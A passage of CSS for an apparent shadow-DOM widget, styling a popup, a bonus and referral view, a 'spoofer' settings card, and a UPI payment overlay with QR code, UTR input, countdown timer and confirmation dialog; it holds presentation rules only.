      height: 64px;
    }
  }
  .wg-overlay {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100%;
    background: rgba(0, 0, 0, 0.75);
    z-index: 2005;
  }
  .wg-overlay.inactive {
    display: none;
  }
  .wg-popup {
    position: fixed;
    top: 50%;
    left: calc(var(--bv-left, 0px) + var(--bv-width, 100%) / 2);
    transform: translate(-50%, -50%);
    z-index: 2006;
    width: min(300px, calc(var(--bv-width, 100%) - 32px));
    background: #1e1e3a;
    border-radius: 18px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
  }
  .wg-popup.inactive {
    display: none;
  }
  :host(.light) .wg-popup {
    background: #fff;
  }
  .wg-close-x {
    position: absolute;
    top: 10px;
    right: 12px;
    width: 26px;
    height: 26px;
    border-radius: 50%;
    background: rgba(255, 255, 255, 0.1);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.7);
    cursor: pointer;
    z-index: 1;
  }
  :host(.light) .wg-close-x {
    background: rgba(0, 0, 0, 0.07);
    color: #666;
  }
  .wg-pop-hero {
    text-align: center;
    padding: 28px 20px 14px;
    background: #1e1e3a;
  }
  :host(.light) .wg-pop-hero {
    background: #fff;
  }
  .wg-pop-icon {
    font-size: 44px;
    line-height: 1;
    margin-bottom: 10px;
  }
  .wg-pop-amount {
    font-size: 28px;
    font-weight: 900;
    color: #fff;
    letter-spacing: -0.5px;
    margin-bottom: 8px;
  }
  :host(.light) .wg-pop-amount {
    color: #111;
  }
  .wg-pop-pill {
    display: inline-block;
    padding: 4px 12px;
    border-radius: 99px;
    background: rgba(245, 180, 0, 0.15);
    border: 1px solid rgba(245, 180, 0, 0.35);
    font-size: 10.5px;
    font-weight: 600;
    color: #f5c842;
    letter-spacing: 0.2px;
  }
  :host(.light) .wg-pop-pill {
    background: rgba(249, 89, 89, 0.08);
    border-color: rgba(249, 89, 89, 0.25);
    color: #f95959;
  }
  .wg-pop-stats {
    display: flex;
    gap: 6px;
    padding: 0 16px 12px;
    justify-content: center;
  }
  .wg-stat-chip {
    flex: 1;
    text-align: center;
    padding: 7px 4px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.1);
    font-size: 10px;
    font-weight: 600;
    color: #c8cad0;
  }
  :host(.light) .wg-stat-chip {
    background: #f5f5ff;
    border-color: #e0e0f0;
    color: #555;
  }
  .wg-pop-body {
    padding: 0 16px 14px;
    font-size: 11.5px;
    color: #7b7e9a;
    line-height: 1.65;
    text-align: center;
  }
  :host(.light) .wg-pop-body {
    color: #777;
  }
  .wg-pop-cta {
    display: block;
    width: calc(100% - 32px);
    margin: 0 16px 10px;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(90deg, #f5a623 0%, #f5c842 100%);
    color: #1a1200;
    font-size: 15px;
    font-weight: 800;
    cursor: pointer;
    font-family: inherit;
    letter-spacing: 0.1px;
  }
  :host(.light) .wg-pop-cta {
    background: linear-gradient(90deg, #f95959 0%, #ff8c6e 100%);
    color: #fff;
  }
  .wg-pop-cta:active {
    opacity: 0.9;
  }
  .wg-pop-footer {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 8px 16px 16px;
    justify-content: center;
  }
  .wg-checkbox {
    width: 17px;
    height: 17px;
    border-radius: 50%;
    border: 1.5px solid #4a4d6a;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    flex-shrink: 0;
    transition:
      background 0.15s,
      border-color 0.15s;
  }
  .wg-checkbox.checked {
    background: #07c160;
    border-color: #07c160;
  }
  .wg-check-tick {
    font-size: 10px;
    color: #fff;
    opacity: 0;
    transition: opacity 0.15s;
  }
  .wg-checkbox.checked .wg-check-tick {
    opacity: 1;
  }
  .wg-no-remind {
    font-size: 11px;
    color: #4a4d6a;
    cursor: pointer;
  }
  :host(.light) .wg-no-remind {
    color: #aaa;
  }
  .bonus-view {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100%;
    z-index: 9999;
    display: none;
    flex-direction: column;
    background: #1a1a2c;
    font-family:
      -apple-system, "system-ui", "Helvetica Neue", Helvetica, "Segoe UI",
      Arial, Roboto, sans-serif;
    color: #c8cad0;
  }
  :host(.light) .bonus-view {
    background: #f7f8ff;
    color: #333;
  }
  .bonus-hdr {
    display: flex;
    align-items: center;
    gap: 0;
    padding: 0 16px;
    height: 49px;
    background: #22224b;
    flex-shrink: 0;
  }
  :host(.light) .bonus-hdr {
    background: linear-gradient(90deg, #f95959 0%, #ff9a8e 100%);
  }
  .bonus-back-btn {
    background: none;
    border: none;
    padding: 0;
    margin-right: 8px;
    cursor: pointer;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 32px;
    height: 32px;
  }
  .bonus-back-btn svg {
    width: 20px;
    height: 20px;
    fill: none;
    stroke: currentColor;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }
  .bonus-ttl {
    font-size: 19px;
    font-weight: 400;
    color: #fff;
    flex: 1;
    text-align: center;
    margin-right: 32px;
  }
  .bonus-scroll {
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
  }
  .bonus-hero {
    padding: 24px 20px 16px;
    text-align: center;
  }
  .bonus-hero-icon {
    font-size: 32px;
    margin-bottom: 6px;
  }
  .bonus-h2 {
    font-size: 18px;
    font-weight: 700;
    color: #e8e9f0;
    margin: 0 0 5px;
    line-height: 1.2;
  }
  :host(.light) .bonus-h2 {
    color: #1a1a1a;
  }
  .bonus-sub {
    font-size: 12px;
    color: #8b8ea0;
    line-height: 1.5;
    margin: 0 auto;
    max-width: 240px;
  }
  :host(.light) .bonus-sub {
    color: #666;
  }
  .bonus-stats-row {
    display: flex;
    gap: 6px;
    padding: 0 14px;
    margin-bottom: 10px;
  }
  .bonus-stat {
    flex: 1;
    text-align: center;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    padding: 10px 4px;
  }
  :host(.light) .bonus-stat {
    background: #fff;
    border-color: #e8e8e8;
  }
  .bonus-stat-val {
    display: block;
    font-size: 15px;
    font-weight: 700;
    color: #f5c842;
    letter-spacing: -0.2px;
  }
  :host(.light) .bonus-stat-val {
    color: #d97706;
  }
  .bonus-stat-lbl {
    display: block;
    font-size: 9px;
    font-weight: 600;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    margin-top: 2px;
  }
  :host(.light) .bonus-stat-lbl {
    color: #999;
  }
  .bonus-prog-card {
    margin: 0 14px 10px;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    padding: 11px 12px;
  }
  :host(.light) .bonus-prog-card {
    background: #fff;
    border-color: #e8e8e8;
  }
  .bonus-prog-lbl {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 10px;
    font-weight: 600;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    margin-bottom: 7px;
  }
  :host(.light) .bonus-prog-lbl {
    color: #999;
  }
  .bonus-prog-count {
    color: #f5c842;
    font-weight: 700;
  }
  :host(.light) .bonus-prog-count {
    color: #d97706;
  }
  .bonus-bar {
    height: 6px;
    border-radius: 99px;
    background: #2d3060;
    overflow: hidden;
  }
  :host(.light) .bonus-bar {
    background: #eee;
  }
  .bonus-bar-fill {
    height: 100%;
    width: 0%;
    border-radius: 99px;
    background: #f5c842;
    transition: width 0.4s ease;
  }
  :host(.light) .bonus-bar-fill {
    background: #f95959;
  }
  .bonus-section-ttl {
    font-size: 10px;
    font-weight: 700;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 8px;
  }
  :host(.light) .bonus-section-ttl {
    color: #bbb;
  }
  .bonus-tiers {
    padding: 0 14px;
    margin-bottom: 14px;
  }
  .bonus-tier {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 12px;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    margin-bottom: 5px;
  }
  :host(.light) .bonus-tier {
    background: #fff;
    border-color: #e8e8e8;
  }
  .tier-badge {
    width: 26px;
    height: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 10px;
    font-weight: 700;
    color: #fff;
    flex-shrink: 0;
    background: #3a3d6b;
  }
  :host(.light) .tier-badge {
    background: #ccc;
  }
  .t-bronze {
    background: #a0522d;
  }
  .t-silver {
    background: #8a9bb5;
  }
  .t-gold {
    background: #d97706;
  }
  .t-diamond {
    background: #6d28d9;
  }
  .tier-info {
    flex: 1;
    font-size: 12px;
    color: #7b7e94;
    line-height: 1.5;
  }
  :host(.light) .tier-info {
    color: #666;
  }
  .tier-info b {
    color: #e8e9f0;
    font-weight: 700;
  }
  :host(.light) .tier-info b {
    color: #222;
  }
  .bonus-cta-btn {
    display: block;
    width: calc(100% - 28px);
    margin: 6px 14px 10px;
    padding: 13px;
    border-radius: 10px;
    border: none;
    background: #f5c842;
    color: #1a1a2c;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    transition: opacity 0.15s;
  }
  :host(.light) .bonus-cta-btn {
    background: #f95959;
    color: #fff;
  }
  .bonus-cta-btn:active {
    opacity: 0.85;
  }
  .bonus-link-preview {
    margin: 0 14px 14px;
    padding: 8px 10px;
    border-radius: 8px;
    background: #22224b;
    border: 1px solid #2d3060;
    font-size: 10px;
    color: #5a5d72;
    word-break: break-all;
    line-height: 1.5;
    font-family: monospace;
  }
  :host(.light) .bonus-link-preview {
    background: #f5f5f5;
    border-color: #e8e8e8;
    color: #999;
  }
  .bonus-rules {
    padding: 0 14px;
    margin-bottom: 14px;
  }
  .bonus-rule {
    font-size: 11px;
    color: #7b7e94;
    line-height: 1.7;
  }
  :host(.light) .bonus-rule {
    color: #666;
  }
  .settings-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .spoofer-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    padding: 14px 13px;
    margin-top: 2px;
  }
  .spoofer-section {
    margin-bottom: 14px;
  }
  .spoofer-section:last-of-type {
    margin-bottom: 12px;
  }
  .spoofer-label {
    display: block;
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--t-dim);
    margin-bottom: 8px;
  }
  .spoofer-row {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .spoofer-row input[type="range"] {
    flex: 1;
    height: 4px;
    -webkit-appearance: none;
    appearance: none;
    background: var(--strip);
    border-radius: 3px;
    outline: none;
    cursor: pointer;
  }
  .spoofer-row input[type="range"]::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: var(--pro);
    border: 2px solid var(--panel-bg);
    cursor: pointer;
    box-shadow: 0 1px 6px rgba(139, 92, 246, 0.4);
  }
  .spoofer-row input[type="number"] {
    width: 52px;
    padding: 5px 6px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: var(--panel-bg);
    color: var(--t-title);
    font-size: 12px;
    font-weight: 700;
    font-family: var(--f);
    text-align: center;
    outline: none;
    -webkit-appearance: none;
    appearance: none;
    -moz-appearance: textfield;
  }
  .spoofer-row input[type="number"]::-webkit-inner-spin-button,
  .spoofer-row input[type="number"]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }
  .spoofer-row input[type="number"]:focus {
    border-color: var(--pro);
  }
  .spoofer-unit {
    font-size: 11px;
    font-weight: 700;
    color: var(--t-dim);
    min-width: 14px;
  }
  .spoofer-reset {
    display: block;
    width: 100%;
    padding: 8px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: transparent;
    color: var(--t-dim);
    font-size: 10.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition: all 0.15s;
    letter-spacing: 0.2px;
    -webkit-appearance: none;
    appearance: none;
  }
  .spoofer-reset:hover {
    border-color: var(--pro);
    color: var(--pro);
  }
  .spoofer-reset:active {
    transform: scale(0.97);
  }
  .pay-overlay {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100vh;
    height: 100dvh;
    background: #1a1a2c;
    z-index: 99999;
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    color: #c8cad0;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    box-sizing: border-box;
    max-width: 100vw;
  }
  :host(.light) .pay-overlay {
    background: #fdfdfd;
    color: #1a1b25;
  }
  .pay-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    height: 56px;
    padding: 0 20px;
    flex-shrink: 0;
    background: #22224b;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    position: relative;
    z-index: 10;
  }
  :host(.light) .pay-hdr {
    background: #fff;
    border-bottom: 1px solid rgba(0, 0, 0, 0.04);
  }
  .pay-back {
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    color: #fff;
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    transition:
      transform 0.2s ease,
      opacity 0.2s ease;
  }
  .pay-back:active {
    transform: translateX(-2px);
    opacity: 0.7;
  }
  :host(.light) .pay-back {
    color: #1a1b25;
  }
  .pay-back svg {
    width: 22px;
    height: 22px;
    stroke-width: 2.5;
  }
  .pay-ttl {
    font-size: 16px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 0;
  }
  :host(.light) .pay-ttl {
    color: #111;
  }
  .pay-body {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    padding-bottom: 34px;
  }
  .pay-content {
    padding-top: 0;
  }
  @keyframes slideUp {
    from {
      opacity: 0;
      transform: translateY(16px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .pay-anim {
    animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) backwards;
  }
  .pay-anim-1 {
    animation-delay: 0.05s;
  }
  .pay-anim-2 {
    animation-delay: 0.1s;
  }
  .pay-anim-3 {
    animation-delay: 0.15s;
  }
  .pay-anim-4 {
    animation-delay: 0.2s;
  }
  .pay-hero {
    position: relative;
    min-height: 148px;
    padding: 22px 20px 34px;
    overflow: hidden;
    background: linear-gradient(
      90deg,
      #fb8466 0%,
      #bd5bd4 33%,
      #7473fa 66%,
      #53b2fa 100%
    );
  }
  :host(.light) .pay-hero {
    background: linear-gradient(90deg, #ff6b6b 0%, #ff9b9b 52%, #fff2f2 100%);
  }
  .pay-hero::after {
    content: "";
    position: absolute;
    inset: auto 0 0;
    height: 46px;
    background: linear-gradient(to bottom, rgba(26, 26, 44, 0), #1a1a2c 82%);
  }
  :host(.light) .pay-hero::after {
    background: linear-gradient(to bottom, rgba(253, 253, 253, 0), #fdfdfd 82%);
  }
  .pay-hero-top {
    position: relative;
    z-index: 1;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    gap: 14px;
  }
  .pay-hero-label {
    display: block;
    color: rgba(255, 255, 255, 0.72);
    font-size: 12px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 7px;
  }
  .pay-hero-sub {
    position: relative;
    z-index: 1;
    margin-top: 10px;
    color: rgba(255, 255, 255, 0.82);
    font-size: 13px;
    font-weight: 600;
  }
  .pay-amount-box {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 32px 20px 24px;
    position: relative;
  }
  .pay-amount-bg {
    position: absolute;
    top: -70px;
    right: -40px;
    width: 210px;
    height: 150px;
    background: rgba(255, 255, 255, 0.26);
    filter: blur(48px);
    opacity: 0.6;
    border-radius: 50%;
    z-index: 0;
  }
  :host(.light) .pay-amount-bg {
    background: linear-gradient(90deg, #f95959, #ff8080);
    filter: blur(50px);
    opacity: 0.1;
  }
  .pay-timer-pill {
    display: flex;
    align-items: center;
    gap: 6px;
    position: relative;
    z-index: 1;
    background: rgba(34, 34, 75, 0.28);
    border: 1px solid rgba(255, 255, 255, 0.25);
    padding: 7px 12px;
    border-radius: 20px;
    flex-shrink: 0;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.16);
  }
  :host(.light) .pay-timer-pill {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.05);
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
  }
  .pay-timer-pill.urgent {
    background: rgba(239, 68, 68, 0.1);
    border-color: rgba(239, 68, 68, 0.2);
    animation: timerShake 0.45s ease infinite;
  }
  .pay-clock {
    width: 14px;
    height: 14px;
    color: #fff;
    flex-shrink: 0;
  }
  :host(.light) .pay-clock {
    color: #f95959;
  }
  .pay-timer-pill.urgent .pay-clock {
    color: #ef4444;
  }
  .pay-timer-txt {
    font-weight: 800;
    color: #fff;
    font-size: 14px;
    font-variant-numeric: tabular-nums;
    letter-spacing: 0.5px;
  }
  :host(.light) .pay-timer-txt {
    color: #f95959;
  }
  .pay-timer-pill.urgent .pay-timer-txt {
    color: #ef4444;
  }
  .pay-amt {
    display: block;
    position: relative;
    z-index: 1;
    font-size: 44px;
    font-weight: 900;
    color: #fff;
    letter-spacing: 0;
    line-height: 0.98;
    text-shadow: 0 8px 24px rgba(0, 0, 0, 0.22);
  }
  :host(.light) .pay-amt {
    color: #fff;
    text-shadow: 0 8px 22px rgba(249, 89, 89, 0.18);
  }
  .pay-section {
    padding: 0 20px;
    margin-bottom: 16px;
  }
  .pay-section-hdr {
    font-size: 12px;
    font-weight: 800;
    color: #8b8ea0;
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  :host(.light) .pay-section-hdr {
    color: #888;
  }
  .pay-qr-card {
    margin-top: -24px;
    position: relative;
    z-index: 2;
  }
  .pay-method-card,
  .pay-form-card {
    position: relative;
    z-index: 1;
  }
  .pay-qr-wrapper {
    background: #22224b;
    border-radius: 22px;
    padding: 18px 18px 16px;
    display: flex;
    flex-direction: column;
    align-items: center;
    border: 1px solid rgba(255, 255, 255, 0.07);
    box-shadow:
      0 14px 34px rgba(0, 0, 0, 0.24),
      inset 0 1px 0 rgba(255, 255, 255, 0.04);
  }
  :host(.light) .pay-qr-wrapper {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.04);
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.04);
  }
  .pay-qr-box {
    background: #fff;
    border-radius: 18px;
    padding: 10px;
    margin-bottom: 12px;
    box-shadow:
      0 7px 24px rgba(0, 0, 0, 0.16),
      0 0 0 1px rgba(0, 0, 0, 0.05);
    position: relative;
  }
  .pay-qr {
    width: 172px;
    height: 172px;
    display: block;
    border-radius: 10px;
    opacity: 0;
    transition: opacity 0.4s ease;
    position: relative;
    z-index: 2;
  }
  .pay-qr.loaded {
    opacity: 1;
  }
  .pay-qr-skeleton {
    position: absolute;
    inset: 10px;
    border-radius: 10px;
    background: rgba(0, 0, 0, 0.03);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1;
  }
  .pay-qr-skeleton svg {
    width: 28px;
    height: 28px;
    animation: paySpin 1s linear infinite;
    color: #8b8ea0;
  }
  @keyframes paySpin {
    100% {
      transform: rotate(360deg);
    }
  }
  .pay-scan-text {
    font-size: 13px;
    color: #b8bbcf;
    font-weight: 700;
    text-align: center;
    line-height: 1.5;
  }
  :host(.light) .pay-scan-text {
    color: #666;
  }
  .pay-upi-row {
    display: flex;
    align-items: center;
    gap: 12px;
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    padding: 13px 14px;
    transition:
      background 0.2s,
      border-color 0.2s;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.03);
  }
  .pay-upi-row:active {
    background: rgba(255, 255, 255, 0.05);
  }
  :host(.light) .pay-upi-row {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
  }
  :host(.light) .pay-upi-row:active {
    background: #f5f5f5;
    border-color: #f95959;
  }
  .pay-upi-info {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 3px;
    min-width: 0;
  }
  .pay-upi-lbl {
    font-size: 11px;
    color: #8b8ea0;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.4px;
  }
  :host(.light) .pay-upi-lbl {
    color: #999;
  }
  .pay-upi-id {
    font-size: 16px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0;
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  :host(.light) .pay-upi-id {
    color: #111;
  }
  .pay-upi-actions {
    display: flex;
    gap: 8px;
    align-items: center;
  }
  .pay-copy-btn {
    background: rgba(160, 143, 255, 0.16);
    color: #fff;
    border: 1px solid rgba(160, 143, 255, 0.18);
    padding: 9px 15px;
    border-radius: 12px;
    font-size: 12px;
    font-weight: 800;
    cursor: pointer;
    transition: all 0.2s ease;
  }
  :host(.light) .pay-copy-btn {
    background: rgba(249, 89, 89, 0.08);
    color: #f95959;
  }
  .pay-copy-btn:hover {
    background: rgba(160, 143, 255, 0.22);
  }
  .pay-copy-btn:active {
    transform: scale(0.95);
  }
  .pay-copy-btn.copied {
    background: #22c55e !important;
    color: #fff !important;
  }
  .pay-route-card {
    width: 100%;
    margin-top: 10px;
    padding: 11px 12px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    background: #22224b;
    color: #fff;
    display: flex;
    align-items: center;
    gap: 11px;
    position: relative;
    overflow: hidden;
    cursor: pointer;
    text-align: left;
    box-shadow:
      inset 3px 0 0 #a08fff,
      inset 0 1px 0 rgba(255, 255, 255, 0.04);
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    transition:
      transform 0.18s ease,
      border-color 0.18s ease,
      background 0.18s ease;
  }
  .pay-route-card:active {
    transform: scale(0.985);
    border-color: rgba(160, 143, 255, 0.38);
    background: #292958;
  }
  .pay-route-index {
    flex: 0 0 auto;
    min-width: 48px;
    padding: 8px 9px;
    border-radius: 12px;
    text-align: center;
    color: #fff;
    font-size: 12px;
    font-weight: 900;
    background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.18);
  }
  .pay-route-copy {
    position: relative;
    z-index: 1;
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 2px;
    min-width: 0;
  }
  .pay-route-title {
    font-size: 12.5px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0;
    line-height: 1.2;
  }
  .pay-route-sub {
    font-size: 11px;
    font-weight: 600;
    color: #b9bdd6;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .pay-route-icon {
    position: relative;
    z-index: 1;
    width: 32px;
    height: 32px;
    flex: 0 0 32px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    background: rgba(160, 143, 255, 0.16);
  }
  .pay-route-icon svg {
    width: 19px;
    height: 19px;
  }
  .pay-route-note {
    margin-top: 10px;
    color: #8b8ea0;
    font-size: 12px;
    font-weight: 600;
    text-align: center;
  }
  :host(.light) .pay-route-card {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
    color: #111;
    box-shadow: inset 3px 0 0 #f95959;
  }
  :host(.light) .pay-route-index {
    background: linear-gradient(90deg, #f95959, #ff8080);
  }
  :host(.light) .pay-route-title {
    color: #111;
  }
  :host(.light) .pay-route-sub,
  :host(.light) .pay-route-note {
    color: #777;
  }
  :host(.light) .pay-route-icon {
    background: rgba(249, 89, 89, 0.08);
    color: #f95959;
  }
  .pay-field-wrapper {
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    display: flex;
    align-items: center;
    padding: 6px 6px 6px 16px;
    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.03);
  }
  .pay-field-wrapper:focus-within {
    border-color: #bd5bd4;
    box-shadow:
      0 0 0 3px rgba(189, 91, 212, 0.15),
      0 4px 12px rgba(0, 0, 0, 0.2);
  }
  :host(.light) .pay-field-wrapper {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.08);
    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.02);
  }
  :host(.light) .pay-field-wrapper:focus-within {
    border-color: #f95959;
    box-shadow: 0 0 0 3px rgba(249, 89, 89, 0.1);
  }
  .pay-utr-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    font-size: 15px;
    font-weight: 500;
    color: #fff;
    font-family: var(--f);
    padding: 10px 0;
    letter-spacing: 1px;
  }
  .pay-utr-input::placeholder {
    color: #5a5d72;
    font-weight: 400;
    letter-spacing: normal;
  }
  :host(.light) .pay-utr-input {
    color: #111;
  }
  :host(.light) .pay-utr-input::placeholder {
    color: #999;
  }
  .pay-paste-pill {
    background: rgba(255, 255, 255, 0.08);
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 9px 14px;
    font-size: 12px;
    font-weight: 800;
    cursor: pointer;
    transition: all 0.2s;
  }
  .pay-paste-pill:active {
    background: rgba(255, 255, 255, 0.1);
    transform: scale(0.95);
  }
  :host(.light) .pay-paste-pill {
    background: rgba(0, 0, 0, 0.04);
    color: #111;
  }
  :host(.light) .pay-paste-pill:active {
    background: rgba(0, 0, 0, 0.08);
  }
  .pay-utr-warn {
    display: flex;
    align-items: flex-start;
    gap: 6px;
    margin-top: 10px;
    padding: 0 4px;
  }
  .pay-utr-warn svg {
    width: 14px;
    height: 14px;
    color: #ef4444;
    flex-shrink: 0;
    margin-top: 1px;
  }
  .pay-utr-warn-txt {
    font-size: 11px;
    color: #ef4444;
    opacity: 0.9;
    line-height: 1.4;
    font-weight: 500;
  }
  .pay-submit-btn {
    width: 100%;
    padding: 16px;
    border-radius: 999px;
    border: none;
    background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa);
    background-size: 200% 200%;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    font-family: var(--f);
    cursor: pointer;
    position: relative;
    overflow: hidden;
    box-shadow:
      0 10px 22px rgba(116, 115, 250, 0.28),
      inset 0 1px 0 rgba(255, 255, 255, 0.22);
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  }
  .pay-submit-btn:active:not(.disabled) {
    transform: translateY(2px) scale(0.98);
    box-shadow:
      0 2px 10px rgba(116, 115, 250, 0.2),
      inset 0 1px 0 rgba(255, 255, 255, 0.1);
  }
  .pay-submit-btn.disabled {
    background: #2a2a35 !important;
    color: #5a5d72 !important;
    box-shadow: none !important;
    cursor: not-allowed;
  }
  :host(.light) .pay-submit-btn {
    background: linear-gradient(90deg, #f95959, #ff8080);
    box-shadow:
      0 6px 20px rgba(249, 89, 89, 0.3),
      inset 0 1px 0 rgba(255, 255, 255, 0.3);
  }
  :host(.light) .pay-submit-btn.disabled {
    background: #e8e8e8 !important;
    color: #999 !important;
  }
  .pay-order-meta {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 20px 0;
    margin-top: 4px;
    position: relative;
  }
  .pay-order-meta::before {
    content: "";
    position: absolute;
    top: 0;
    left: 20px;
    right: 20px;
    height: 1px;
    background: rgba(255, 255, 255, 0.05);
  }
  :host(.light) .pay-order-meta::before {
    background: rgba(0, 0, 0, 0.05);
  }
  .pay-order-lbl {
    font-size: 12px;
    color: #5a5d72;
    font-weight: 500;
  }
  .pay-order-val {
    font-size: 13px;
    color: #8b8ea0;
    font-family: monospace;
    letter-spacing: 0.5px;
  }
  .pay-confirm-mask {
    position: fixed;
    inset: 0;
    z-index: 100000;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
  }
  .pay-confirm-mask::before {
    content: "";
    position: absolute;
    inset: 0;
    background: rgba(0, 0, 0, 0.7);
    backdrop-filter: blur(4px);
  }
  .pay-confirm-mask.active {
    opacity: 1;
    pointer-events: auto;
  }
  .pay-confirm-box {
    position: relative;
    z-index: 1;
    width: 100%;
    max-width: 310px;
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 20px;
    padding: 28px 24px 24px;
    text-align: center;
    transform: scale(0.95) translateY(10px);
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    box-shadow:
      0 20px 40px rgba(0, 0, 0, 0.4),
      inset 0 1px 0 rgba(255, 255, 255, 0.05);
  }
  .pay-confirm-mask.active .pay-confirm-box {
    transform: scale(1) translateY(0);
  }
  :host(.light) .pay-confirm-box {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.05);
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  }
  .pay-conf-icon {
    width: 48px;
    height: 48px;
    margin: 0 auto 16px;
    color: #c4b5fd;
    background: rgba(196, 181, 253, 0.1);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .pay-conf-icon svg {
    width: 24px;
    height: 24px;
  }
  :host(.light) .pay-conf-icon {
    color: #f95959;
    background: rgba(249, 89, 89, 0.08);
  }
  .pay-conf-ttl {
    font-size: 18px;
    font-weight: 700;
    color: #fff;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  :host(.light) .pay-conf-ttl {
    color: #111;
  }
  .pay-conf-msg {
    font-size: 13.5px;
    color: #8b8ea0;
    line-height: 1.5;
    margin-bottom: 28px;
  }
  .pay-conf-msg b {
    color: #fff;
    font-weight: 600;
  }
  :host(.light) .pay-conf-msg {
